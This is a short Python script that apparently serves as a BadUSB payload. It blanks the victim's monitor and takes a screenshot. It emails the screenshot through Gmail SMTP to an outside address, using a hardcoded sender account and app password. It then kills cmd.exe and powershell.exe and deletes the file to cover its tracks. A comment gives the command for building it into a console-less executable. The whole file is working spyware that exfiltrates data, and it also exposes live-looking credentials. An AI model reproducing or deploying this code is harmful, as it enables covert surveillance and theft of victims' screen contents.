import sys
import time
import win32api
import win32con
import os.path
import smtplib # библиотека Для отправки сообщений
import pyscreenshot
import mouse

from PIL import ImageGrab

from email.mime.text import MIMEText # библиотека которая облегчает отправку сообщений (вместо большого кода всего 4 строки)
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
print("start")
def ScreenOFF():
    return win32api.PostMessage(win32con.HWND_BROADCAST,win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
def ScreenON():
    return win32api.SendMessage(win32con.HWND_BROADCAST,win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
ScreenOFF()
fileName = "GeeksforGeeks.png"
pathToFile = f"C:/Badusb/{fileName}"
if (os.path.exists("C:/Badusb")):
    print("dir exist")
    if(os.path.exists(pathToFile)):
        os.remove(pathToFile)
else:
    print("dir not exist")
    os.makedirs("C:/Badusb")
imageNEW = ImageGrab.grab()
imageNEW.save(pathToFile)
print("success save file")
SMTPmail = smtplib.SMTP('smtp.gmail.com', 587) # обращаемся к серверам гугл
SMTPmail.starttls() # проверка подключения
SMTPmail.login('weatherforaday@gmail.com','vxoh qcqd vqaw zbws') # вход в заранее заготовленный аккаунт
listOfEmails = ["4eburashka1orig@gmail.com"] # лист почт на которые мы будем писать рассылку
Text = f"Hello {listOfEmails[0]}.\nHere your screen"  # Текст письма
Subject = "New Message!"  # Заголовок письма
Message = MIMEMultipart() # вспомогающий метод, для создания писем
Message['Subject'] = listOfEmails[0] # Заголовок письма
Message['From'] = 'weatherforaday@gmail.com'  # отправитель
Message['To'] = listOfEmails[0] # получатель
part = MIMEApplication(open(pathToFile, 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename=pathToFile)
Message.attach(part)
SMTPmail.sendmail("weatherforaday@gmail.com", listOfEmails[0], Message.as_string()) # отправляем его
#mouse.drag(0, 0, 0, 1, absolute=False, duration=0.5)
os.system("taskkill /im cmd.exe")
os.system("taskkill /im powershell.exe")
os.remove(pathToFile)
time.sleep(5)
ScreenON()
#python -m PyInstaller --noconsole --hidden-import 'package_name' --onefile 'MailSender.py'